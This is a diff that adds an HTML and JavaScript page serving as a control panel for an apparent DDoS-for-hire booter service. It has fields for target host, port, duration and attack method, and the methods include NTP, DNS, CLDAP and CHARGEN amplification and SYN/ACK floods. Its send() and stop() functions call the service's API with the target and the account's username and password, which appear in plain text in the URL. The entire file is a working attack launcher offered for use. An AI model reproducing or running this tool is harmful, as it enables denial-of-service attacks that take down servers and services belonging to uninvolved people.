@@ -1,0 +1,86 @@
+<script>
+function send()
+{
+   var h = document.getElementById("h").value;
+   var t = document.getElementById("t").value;
+   var p = document.getElementById("p").value;
+   var m = document.getElementById('m');
+   var m2 = m.options[m.selectedIndex].text;
+
+    var un = document.getElementById("un").value;
+    var pw = document.getElementById("pw").value;
+    
+
+    var url = 'https://api.stressing.to/l4.php?username=' + un + '&password=' + pw + '&target=' + h + '&time=' + t + '&port=' + p + '&method=' + m2;
+    document.getElementById("if").src = url;
+    //document.getElementById('output').innerHTML = url;
+
+}
+
+function stop()
+{
+    var h = document.getElementById("h").value;
+   var t = document.getElementById("t").value;
+   var p = document.getElementById("p").value;
+   var m2 = "STOP";
+
+    var un = document.getElementById("un").value;
+    var pw = document.getElementById("pw").value;
+    
+
+    var url = 'https://api.stressing.to/l4.php?username=' + un + '&password=' + pw + '&target=' + h + '&time=' + t + '&port=' + p + '&method=' + m2;
+    document.getElementById("if").src = url; 
+}
+</script>
+
+h
+<br />
+<input type='text' id='h'>
+<br />
+t
+<br />
+<input type='text' id='t'>
+<br />
+p
+<br />
+<input type='text' id='p'>
+<br />
+m
+<br />
+<select id='m'>
+    <option value='NTP'>NTP</option>
+    <option value='DNS'>DNS</option>
+    <option value='CLDAP'>CLDAP</option>
+    <option value='XSYN'>XSYN</option>
+    <option value='XACK'>XACK</option>
+    <option value='NTP-PREMIUM'>NTP-PREMIUM</option>
+    <option value='MIXAMP'>MIXAMP</option>
+    <option value='ARD'>ARD</option>
+    <option value='CHARGEN'>CHARGEN</option>
+    </select>
+<br />
+<br />
+<input type='button' value= ' do ' onClick='send()'>
+<input type='button' value=' end ' onClick='stop()' style='margin-left: 20px; color: red'
+<br /><br />
+<div id='output'>
+<iframe src='https://ip4.me' width='40%' height='20%' frameborder='0' id='if'></iframe>
+</div>
+
+<br />
+un <br />
+<input type='text' id='un'>
+<br />
+pw
+<br />
+<input type='password' id='pw'>
+
+
+
+
+
+
+
+
+
+
